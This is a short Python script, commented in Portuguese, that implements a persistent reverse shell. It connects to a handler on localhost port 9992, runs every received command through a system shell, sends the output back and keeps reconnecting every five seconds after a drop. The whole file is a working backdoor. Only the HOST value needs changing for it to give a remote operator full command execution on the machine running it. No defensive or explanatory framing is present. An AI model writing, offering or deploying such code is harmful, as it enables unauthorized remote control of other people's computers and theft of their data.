import socket, subprocess, time, os

def init_server():
    HOST = 'localhost'
    PORT = 9992

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            print("[*] Conectado ao handler")

            while True:
                try:
                    data = s.recv(4096)
                    if not data:
                        raise Exception("Conexão perdida")  # força pular pro except

                    cmd = data.decode()

                    if cmd.startswith('cd '):
                        _dir = cmd[3:].strip()
                        try:
                            os.chdir(_dir)
                        except:
                            pass
                        continue # aqui ele volta pro inicio do while


                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output, error = process.communicate()
                    resposta = output + error
                    s.sendall(resposta)

                except Exception as e:
                    print(f"[!] Sessão encerrada: {e}")
                    s.close()
                    break  # volta ao loop externo e tenta reconectar

        except Exception as e:
            print(f"[!] Erro ao conectar: {e}")
            time.sleep(5)

if __name__ == "__main__":
    init_server()
